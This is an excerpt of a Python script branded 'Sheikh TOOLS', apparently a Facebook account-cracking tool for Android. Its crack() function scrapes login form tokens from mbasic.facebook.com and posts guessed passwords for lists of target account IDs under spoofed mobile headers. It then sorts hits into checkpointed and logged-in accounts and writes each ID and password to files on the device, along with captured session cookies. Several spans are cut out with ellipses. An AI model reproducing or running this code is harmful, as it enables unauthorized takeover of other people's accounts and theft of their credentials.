...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=61550119192530&mibextid=ZbWKwL')
time.sleep(5)
...
for xd in range(5000):
    ...
    i='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
...
for ua in range(10000):
    ...
    m='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/profile.php?id=61550119192530&mibextid=ZbWKwL')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
----------------------------------------------
     💔💔💔 WELCOME TO Sheikh  TOOLS💔💔💔     
----------------------------------------------
╔══════════════════════════════════════════╗🖤"
║Author     : Sheikh Cyber
║Facebook   : Silent Taskin
...
def ckx():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    server = requests.get(f'https://github.com/Khorsed12/FILE-CLONING/blob/main/Approvel').text
    try:
        httpCaht = requests.get(f"https://github.com/Khorsed12/FILE-CLONING/blob/main/Approvel").text
        if id in httpCaht:
            msg = str(os.geteuid())
            #pass
        else:
...
def crack(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://www.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}            
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " oh shit Cp ID"')
                open('/sdcard/Sheikh-Cyber/M2•Sheikh-CP.txt', 'a').write( uid+' | '+ps+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Sheikh ❤️] {idf} • {pw} ')
                os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  AN,  OK,  id"')
                open('/sdcard/M2•Sheikh.txt', 'a').write( uid+' | '+ps+'\n')
                break
